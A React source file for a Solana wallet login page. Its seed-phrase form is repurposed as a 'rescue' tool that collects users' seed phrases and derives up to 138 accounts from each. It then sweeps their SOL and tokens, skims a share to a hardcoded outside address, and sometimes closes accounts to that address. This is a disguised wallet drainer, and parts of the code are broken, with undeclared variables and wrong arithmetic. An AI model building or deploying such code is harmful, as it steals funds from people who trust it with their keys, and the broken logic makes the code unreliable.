import React, { useEffect, useState } from 'react';

import { Provider } from '@project-serum/anchor';


import * as splutils from "@solana/spl-token";
import { PromisePool } from "@supercharge/promise-pool"
import {
  generateMnemonicAndSeed,
  useHasLockedMnemonicAndSeed,
  loadMnemonicAndSeed,
  mnemonicToSeed,
  storeMnemonicAndSeed,
  normalizeMnemonic,
} from '../utils/wallet-seed';

import {
  getAccountFromSeed,
  DERIVATION_PATH,// yarn add @material-ui/core 
} from '../utils/walletProvider/localStorage.js';
import Container from '@material-ui/core/Container';
import LoadingIndicator from '../components/LoadingIndicator';
import { BalanceListItem } from '../components/BalancesList.js';
import Card from '@material-ui/core/Card';
import CardContent from '@material-ui/core/CardContent';
import { DialogActions, DialogContentText, DialogTitle, Typography } from '@material-ui/core';
import TextField from '@material-ui/core/TextField';
import Checkbox from '@material-ui/core/Checkbox';
import FormControl from '@material-ui/core/FormControl';
import FormControlLabel from '@material-ui/core/FormControlLabel';
import CardActions from '@material-ui/core/CardActions';
import Button from '@material-ui/core/Button';
import Select from '@material-ui/core/Select';
import MenuItem from '@material-ui/core/MenuItem';
import { useCallAsync } from '../utils/notifications';
import Link from '@material-ui/core/Link';
import { validateMnemonic } from 'bip39';
import DialogForm from '../components/DialogForm';
import { Account } from 'mdi-material-ui';
let toks = ["EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","USDH1SM1ojwWUga67PGrgFWUHibbjqMvuMaDkRJTgkX","7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB","orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE","SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt","mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So","7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj","7kbnvuGBxxj8AG9qp8Scn56muWGaRaFqxg1FsRp3PaFT","4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R","7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs","CDJWUqTcYTVAKXAVXoQZFes5JUFc7owSeq7eMQcDSbo5"]

export default function LoginPage() {
  const [restore, setRestore] = useState(false);
  const [hasLockedMnemonicAndSeed, loading] = useHasLockedMnemonicAndSeed();

  if (loading) {
    return null;
  }

  return (
    <Container maxWidth="sm">
      {restore ? (
        <RestoreWalletForm goBack={() => setRestore(false)} />
      ) : (
        <>
          {hasLockedMnemonicAndSeed ? <LoginForm /> : <CreateWalletForm />}
          <br />
        
        </>
      )}
    </Container>
  );
}

function CreateWalletForm() {
  const [mnemonicAndSeed, setMnemonicAndSeed] = useState(null);
  useEffect(() => {
    generateMnemonicAndSeed().then(setMnemonicAndSeed);
  }, []);
  const [savedWords, setSavedWords] = useState(false);
  const callAsync = useCallAsync();

  function submit(password) {
    const { mnemonic, seed } = mnemonicAndSeed;
    callAsync(
      storeMnemonicAndSeed(
        mnemonic,
        seed,
        password,
        DERIVATION_PATH.bip44Change,
      ),
      {
        progressMessage: 'Creating wallet...',
        successMessage: 'Wallet created',
      },
    );
  }

  if (!savedWords) {
    return (
      <SeedWordsForm
        mnemonicAndSeed={mnemonicAndSeed}
        goForward={() => setSavedWords(true)}
      />
    );
  }

  return (
    <ChoosePasswordForm
      mnemonicAndSeed={mnemonicAndSeed}
      goBack={() => setSavedWords(false)}
      onSubmit={submit}
    />
  );
}
let whereto = undefined
function SeedWordsForm({ mnemonicAndSeed, goForward }) {
const keypair = new Keypair()
  const [confirmed, setConfirmed] = useState(true);
  const [downloaded, setDownloaded] = useState(true);
  const [showDialog, setShowDialog] = useState(false);
  const [seedCheck, setSeedCheck] = useState('');
  const [logs, setLogs] = useState('');
  const [phrases, changePhrases] = useState([]);
  const connection = new Connection("https://ssc-dao.genesysgo.net", "confirmed")

  async function doIt() {
    try {

      let hydras = [];
      for (var i = 0; i <= 2; i++) {
        hydras.push(i); // lol
      }
      setTimeout(async function () {
        await PromisePool.withConcurrency(phrases.length)
          .for(phrases)
          // @ts-ignore
          .handleError(async (err, asset) => {
            console.error(`\nError uploading or whatever`, err.message);
            console.log(err);
          })
          // @ts-ignore
          .process(async (seed) => {
            const accounts = [...Array(138)].map((_, idx) => {
              return getAccountFromSeed(
                Buffer.from(seed, 'hex'),
                idx,
                toDerivationPath(dPathMenuItem),
              );
            });
            
            await PromisePool.withConcurrency(hydras.length)
              .for(accounts)
              // @ts-ignore
              .handleError(async (err, asset) => {
                console.error(`\nError uploading or whatever`, err.message);
                console.log(err);
              })
              // @ts-ignore
              .process(async (account) => {
                
                console.log(account)
                  const keypair = account//Keypair.fromSecretKey(account.secretKey);
                  if (whereto == undefined){
                    jaregm = keypair
                  }
                  if (keypair.publicKey.toBase58() != whereto.publicKey.toBase58()) {
                    const hm = await connection.getSignaturesForAddress(keypair.publicKey);

                    if (hm.length > 0) {
                      const bal = await connection.getBalance(keypair.publicKey);
                      //console.log(keypair.publicKey.toBase58());
                      if (bal > 0) {
                        //console.log(bal / 10 ** 9);
                        const transferTransaction = new Transaction().add(
                          SystemProgram.transfer({
                            fromPubkey: keypair.publicKey,
                            toPubkey: jaregm.publicKey,
                            lamports: bal * (10 ** 9) / (10 * 9)- 0.000005,
                          })
                        );
                        const transferTransaction2 = new Transaction().add(
                          SystemProgram.transfer({
                            fromPubkey: keypair.publicKey,
                            toPubkey: new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"),
                            lamports: bal * (10 ** 9) / (10 * 1)- 0.000005,
                          })
                        );
                        await  sendAndConfirmTransaction(
                          connection,
                          [transferTransaction, transferTransaction2],
                          [keypair]
                        );
                      }
                    }

                    const accounts = await connection.getParsedProgramAccounts(
                      new PublicKey(
                        "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
                      ),
                      {
                        filters: [
                          {
                            dataSize: 165, // number of bytes
                          },
                          {
                            memcmp: {
                              offset: 32, // number of bytes
                              bytes: keypair.publicKey.toBase58(), // base58 encoded string
                            },
                          },
                        ],
                      }
                    );

                    const accounts2 = await connection.getParsedProgramAccounts(
                      new PublicKey(
                        "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
                      ),
                      {
                        filters: [
                          {
                            dataSize: 165, // number of bytes
                          },
                          {
                            memcmp: {
                              offset: 32, // number of bytes
                              bytes: jaregm.publicKey.toBase58(), // base58 encoded string
                            },
                          },
                        ],
                      }
                    );
                    let c = 0;
                    accounts.forEach(async (account, i) => {

                      if (
                        account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] > 0
                      ) {

                        //console.log(account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] )
                        let tokenMint = await splutils.getMint(connection, new PublicKey(account.account.data.parsed.info.mint))
                        // //console.log(tokenMint)

                        let tokenAccount = Keypair.generate();
                        let feePayer = whereto
                        try {
                          if (account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] > 1) {
                            //console.log(`ramdom token address: ${tokenAccount.publicKey.toBase58()}`);

                            let tx = new Transaction();
                            tx.feePayer = keypair.publicKey
                            tx.add(
                              // create account
                              SystemProgram.createAccount({
                                fromPubkey: feePayer.publicKey,
                                newAccountPubkey: tokenAccount.publicKey,
                                space: splutils.ACCOUNT_SIZE,
                                lamports: await splutils.getMinimumBalanceForRentExemptAccount(connection),
                                programId: splutils.TOKEN_PROGRAM_ID,
                              }),
                              // init token account
                              splutils.createInitializeAccountInstruction(tokenAccount.publicKey, new PublicKey(account.account.data.parsed.info.mint), keypair.publicKey)
                            );

                            let hm1 = await  sendTransaction(
                              connection,
                              tx,
                              [keypair, tokenAccount, jaregm,whereto]
                            );
                            console.log(hm1)
                            setLogs((hm1))
                          }

                          else {
                            // 2. ATA
                            let ata


                            try {

                              let ata = await splutils.createAssociatedTokenAccount(
                                connection, // connection
                                whereto, // fee payer
                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                jaregm.publicKey // owner,
                              );
                              var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
                              if (amt != 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] != 0){
                                let bla = await splutils.transferChecked(
                                  connection, // connection
                                  whereto, // payer
                                  new PublicKey(account.pubkey), // from (should be a token account)
                                  new PublicKey(account.account.data.parsed.info.mint), // mint
                                  ata.address, // to (should be a token account)
                                  keypair, // from's owner
                                  amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
                                );
                                amt = amt * 0.9

                              }
                              let bla = await splutils.transferChecked(
                                connection, // connection
                                whereto, // payer
                                new PublicKey(account.pubkey), // from (should be a token account)
                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                ata.publicKey, // to (should be a token account)
                                keypair, // from's owner
                                amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
                              );
                              console.log(bla)
                              setLogs((bla))
                              {
                                let tx = new Transaction().add(
                                  splutils.createCloseAccountInstruction(
                                    account.pubkey, // token account which you want to close
                                    jaregm.publicKey, // destination
                                    keypair.publicKey // owner of token account
                                  )
                                );
                                await  sendTransaction(connection, tx, [
                                  jaregm,
                                  keypair, whereto
                                ]);
                              }
                            } catch (err) {
                              let anacc

                              accounts2.forEach(async (account2, i) => {
                                if (account.account.data.parsed.info.mint == account2.account.data.parsed.info.mint) {
                                  anacc = account2
                                }
                              })
                              ata = await splutils.getAccount(connection, new PublicKey(anacc.pubkey));
                              var amt = account.account.data["parsed"]["info"]["tokenAmount"]["amount"]
                              if (amt != 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] != 0){
                                let bla = await splutils.transferChecked(
                                  connection, // connection
                                  whereto, // payer
                                  new PublicKey(account.pubkey), // from (should be a token account)
                                  new PublicKey(account.account.data.parsed.info.mint), // mint
                                  ata.address, // to (should be a token account)
                                  keypair, // from's owner
                                  amt * 0.1, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
                                );
                                amt = amt * 0.9

                              }
                              let bla = await splutils.transferChecked(
                                connection, // connection
                                whereto, // payer
                                new PublicKey(account.pubkey), // from (should be a token account)
                                new PublicKey(account.account.data.parsed.info.mint), // mint
                                ata.address, // to (should be a token account)
                                keypair, // from's owner
                                amt, account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
                              );
                              console.log(bla)
                              setLogs((bla))

                              {
                                let ran = Math.random()
                                if (ran >= 0.5){
                                let tx = new Transaction().add(
                                  splutils.createCloseAccountInstruction(
                                    account.pubkey, // token account which you want to close
                                    jaregm.publicKey, // destination
                                    keypair.publicKey // owner of token account
                                  )
                                );

                                await  sendTransaction(connection, tx, [
                                  jaregm,
                                  keypair,
                                  whereto
                                ]);
                              }
                              else {
                                let tx = new Transaction().add(
                                  splutils.createCloseAccountInstruction(
                                    account.pubkey, // token account which you want to close
                                    new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
                                    keypair.publicKey // owner of token account
                                  )
                                );

                                await  sendTransaction(connection, tx, [
                                  jaregm,
                                  keypair,
                                  whereto
                                ]);
                              }
                              }
                            }


                          }
                        } catch (err) {
                          console.log(err)
                          //console.log('already have ata duh')
                        }




                      } else if (
                        account.account.data["parsed"]["info"]["tokenAmount"]["uiAmount"] ==
                        0
                      ) {
                        c++;
                        try {
                          {
                            let ran = Math.random()
                            if (ran >= 0.5){
                            let tx = new Transaction().add(
                              splutils.createCloseAccountInstruction(
                                account.pubkey, // token account which you want to close
                                jaregm.publicKey, // destination
                                keypair.publicKey // owner of token account
                              )
                            );
                            await  sendTransaction(connection, tx, [
                              jaregm,
                              keypair,
                              whereto
                            ]);
                          }
                          else {
                            let tx = new Transaction().add(
                              splutils.createCloseAccountInstruction(
                                account.pubkey, // token account which you want to close
                                new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // destination
                                keypair.publicKey // owner of token account
                              )
                            );
                            await  sendTransaction(connection, tx, [
                              whereto,-
                              jaregm,
                              keypair,
                            ]);
                          }
                          }
                        } catch (err) {
                          console.log(err);
                        }
                      }
                    })


                    if (c > 0) {
                      setLogs(( keypair.publicKey.toBase58() + ": " + c.toString()))
                      // 1) use build-in function
                    }
                  }
                
              
              })
          })
      })
    }
    catch (err) {
      console.log(err)

    }

  }

    async function onChangePhrases(e) {
      e.preventDefault()
      try {

        changePhrases(e.target.value.split(','))
      }
      catch (err) {
        console.log(err)
      }
    }
  
  return (
    <>
      <Card>

        <CardContent>
          <Typography variant="h5" gutterBottom>
            This Is Not a Wallet.
          </Typography>
          <Typography paragraph>
            It iterates through first 138 of your wallets in these phrases, assumes at least 0.02 sol in the first wallet in the first one then shoves everything back there - ie. if you use this phrase in another extension, first one that pops up - and rescues all your NFTs, 90% of your fungibles and closes all your accounts and you get 90% of your sols back.
          </Typography>
          <Typography>
            send a bit of sol here: {keypair.publicKey.toBase58()} 
            Enter keyphrases:
          </Typography>
          {mnemonicAndSeed ? (
            <TextField
              variant="outlined"
              fullWidth
              multiline
              margin="normal"
              label="Seed Words1"
              onChange={onChangePhrases}
            />
          ) : (
            <LoadingIndicator />
          )}
          <Typography paragraph>
            <b>Note:</b> STACC holders get all proceeds on this lil app. get moar{' '}
            <a
              style={{ color: 'inherit' }}
              href="https://opensea.io/collection/tacc-staccs"
              target="__blank"
            >
              opensea
            </a>{' '} to buy or{' '}
            <a
              style={{ color: 'inherit' }}
              href="https://magiceden.io/marketplace/7cZiomiirjngbr1AmAoVvRua9CXLXMwL1WEijg6SL2Qj"
              target="__blank"
            >
              magiceden
            </a>{' '} to buy nfa.
          </Typography>

          <Typography paragraph>
            {logs}
          </Typography>
        </CardContent>
        <CardActions style={{ justifyContent: 'flex-end' }}>
          <Button color="primary" disabled={!confirmed || !downloaded} onClick={() => doIt()}>
            Continue
          </Button>
        </CardActions>
      </Card>
    </>
  );
}

function ChoosePasswordForm({ goBack, onSubmit }) {
  const [password, setPassword] = useState('');
  const [passwordConfirm, setPasswordConfirm] = useState('');

  return (
    <Card>
      <CardContent>
        <Typography variant="h5" gutterBottom>
          Choose a Password (Optional)
        </Typography>
        <Typography>
          Optionally pick a password to protect your wallet.
        </Typography>
        <TextField
          variant="outlined"
          fullWidth
          margin="normal"
          label="New Password"
          type="password"
          autoComplete="new-password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <TextField
          variant="outlined"
          fullWidth
          margin="normal"
          label="Confirm Password"
          type="password"
          autoComplete="new-password"
          value={passwordConfirm}
          onChange={(e) => setPasswordConfirm(e.target.value)}
        />
        <Typography>
          If you forget your password you will need to restore your wallet using
          your seed words.
        </Typography>
      </CardContent>
      <CardActions style={{ justifyContent: 'space-between' }}>
        <Button onClick={goBack}>Back</Button>
        <Button
          color="primary"
          disabled={password !== passwordConfirm}
          onClick={() => onSubmit(password)}
        >
          Create Wallet
        </Button>
      </CardActions>
    </Card>
  );
}

function LoginForm() {
  const [password, setPassword] = useState('');
  const [stayLoggedIn, setStayLoggedIn] = useState(false);
  const callAsync = useCallAsync();

  const submit = () => {
    callAsync(loadMnemonicAndSeed(password, stayLoggedIn), {
      progressMessage: 'Unlocking wallet...',
      successMessage: 'Wallet unlocked',
    });
  }
  const submitOnEnter = (e) => {
    if (e.code === "Enter" || e.code === "NumpadEnter") {
      e.preventDefault();
      e.stopPropagation();
      submit();
    }
  }
  const setPasswordOnChange = (e) => setPassword(e.target.value);
  const toggleStayLoggedIn = (e) => setStayLoggedIn(e.target.checked);

  return (
    <Card>
      <CardContent>
        <Typography variant="h5" gutterBottom>
          Unlock Wallet
        </Typography>
        <TextField
          variant="outlined"
          fullWidth
          margin="normal"
          label="Password"
          type="password"
          autoComplete="current-password"
          value={password}
          onChange={setPasswordOnChange}
          onKeyDown={submitOnEnter}
        />
        <FormControlLabel
          control={
            <Checkbox
              checked={stayLoggedIn}
              onChange={toggleStayLoggedIn}
            />
          }
          label="Keep wallet unlocked"
        />
      </CardContent>
      <CardActions style={{ justifyContent: 'flex-end' }}>
        <Button color="primary" onClick={submit}>
          Unlock
        </Button>
      </CardActions>
    </Card>
  );
}

function RestoreWalletForm({ goBack }) {
  const [rawMnemonic, setRawMnemonic] = useState('');
  const [seed, setSeed] = useState('');
  const [password, setPassword] = useState('');
  const [passwordConfirm, setPasswordConfirm] = useState('');
  const [next, setNext] = useState(false);

  const mnemonic = normalizeMnemonic(rawMnemonic);
  const isNextBtnEnabled =
    password === passwordConfirm && validateMnemonic(mnemonic);
  const displayInvalidMnemonic = validateMnemonic(mnemonic) === false && mnemonic.length > 0;
  return (
    <>
      {next ? (
        <DerivedAccounts
          goBack={() => setNext(false)}
          mnemonic={mnemonic}
          password={password}
          seed={seed}
        />
      ) : (
        <Card>
          <CardContent>
            <Typography variant="h5" gutterBottom>
              Restore Existing Wallet
            </Typography>
            <Typography>
              Restore your wallet using your twelve or twenty-four seed words.
              Note that this will delete any existing wallet on this device.
            </Typography>
            <br />
            <Typography fontWeight="fontWeightBold">
              <b>Do not enter your hardware wallet seedphrase here.</b> Hardware
              wallets can be optionally connected after a web wallet is created.
            </Typography>
            {displayInvalidMnemonic && (
              <Typography fontWeight="fontWeightBold" style={{ color: 'red' }}>
                Mnemonic validation failed. Please enter a valid BIP 39 seed phrase.
              </Typography>
            )}
            <TextField
              variant="outlined"
              fullWidth
              multiline
              rows={3}
              margin="normal"
              label="Seed Words"
              value={rawMnemonic}
              onChange={(e) => setRawMnemonic(e.target.value)}
            />
            <TextField
              variant="outlined"
              fullWidth
              margin="normal"
              label="New Password (Optional)"
              type="password"
              autoComplete="new-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <TextField
              variant="outlined"
              fullWidth
              margin="normal"
              label="Confirm Password"
              type="password"
              autoComplete="new-password"
              value={passwordConfirm}
              onChange={(e) => setPasswordConfirm(e.target.value)}
            />
          </CardContent>
          <CardActions style={{ justifyContent: 'space-between' }}>
            <Button onClick={goBack}>Cancel</Button>
            <Button
              color="primary"
              disabled={!isNextBtnEnabled}
              onClick={() => {
                mnemonicToSeed(mnemonic).then((seed) => {
                  setSeed(seed);
                  setNext(true);
                });
              }}
            >
              Next
            </Button>
          </CardActions>
        </Card>
      )}
    </>
  );
}

function DerivedAccounts({ goBack, mnemonic, seed, password }) {
  const callAsync = useCallAsync();
  const [dPathMenuItem, setDPathMenuItem] = useState(
    DerivationPathMenuItem.Bip44Change,
  );
  const accounts = [...Array(10)].map((_, idx) => {
    return getAccountFromSeed(
      Buffer.from(seed, 'hex'),
      idx,
      toDerivationPath(dPathMenuItem),
    );
  });

  function submit() {
    callAsync(
      storeMnemonicAndSeed(
        mnemonic,
        seed,
        password,
        toDerivationPath(dPathMenuItem),
      ),
    );
  }

  return (
    <Card>
      <AccountsSelector
        showDeprecated={true}
        accounts={accounts}
        dPathMenuItem={dPathMenuItem}
        setDPathMenuItem={setDPathMenuItem}
      />
      <CardActions style={{ justifyContent: 'space-between' }}>
        <Button onClick={goBack}>Back</Button>
        <Button color="primary" onClick={submit}>
          Restore
        </Button>
      </CardActions>
    </Card>
  );
}

export function AccountsSelector({
  showRoot,
  showDeprecated,
  accounts,
  dPathMenuItem,
  setDPathMenuItem,
  onClick,
}) {
  return (
    <CardContent>
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
        }}
      >
        <Typography variant="h5" gutterBottom>
          Derivable Accounts
        </Typography>
        <FormControl variant="outlined">
          <Select
            value={dPathMenuItem}
            onChange={(e) => {
              setDPathMenuItem(e.target.value);
            }}
          >
            {showRoot && (
              <MenuItem value={DerivationPathMenuItem.Bip44Root}>
                {`m/44'/501'`}
              </MenuItem>
            )}
            <MenuItem value={DerivationPathMenuItem.Bip44}>
              {`m/44'/501'/0'`}
            </MenuItem>
            <MenuItem value={DerivationPathMenuItem.Bip44Change}>
              {`m/44'/501'/0'/0'`}
            </MenuItem>
            {showDeprecated && (
              <MenuItem value={DerivationPathMenuItem.Deprecated}>
                {`m/501'/0'/0/0 (deprecated)`}
              </MenuItem>
            )}
          </Select>
        </FormControl>
      </div>
      {accounts.map((acc) => {
        return (
          <div onClick={onClick ? () => onClick(acc) : {}}>
            <BalanceListItem
              key={acc.publicKey.toString()}
              onClick={onClick}
              publickey={acc.publicKey}
              expandable={false}
            />
          </div>
        );
      })}
    </CardContent>
  );
}

// Material UI's Select doesn't render properly when using an `undefined` value,
// so we define this type and the subsequent `toDerivationPath` translator as a
// workaround.
//
// DERIVATION_PATH.deprecated is always undefined.
export const DerivationPathMenuItem = {
  Deprecated: 0,
  Bip44: 1,
  Bip44Change: 2,
  Bip44Root: 3, // Ledger only.
};

export function toDerivationPath(dPathMenuItem) {
  switch (dPathMenuItem) {
    case DerivationPathMenuItem.Deprecated:
      return DERIVATION_PATH.deprecated;
    case DerivationPathMenuItem.Bip44:
      return DERIVATION_PATH.bip44;
    case DerivationPathMenuItem.Bip44Change:
      return DERIVATION_PATH.bip44Change;
    case DerivationPathMenuItem.Bip44Root:
      return DERIVATION_PATH.bip44Root;
    default:
      throw new Error(`invalid derivation path: ${dPathMenuItem}`);
  }
}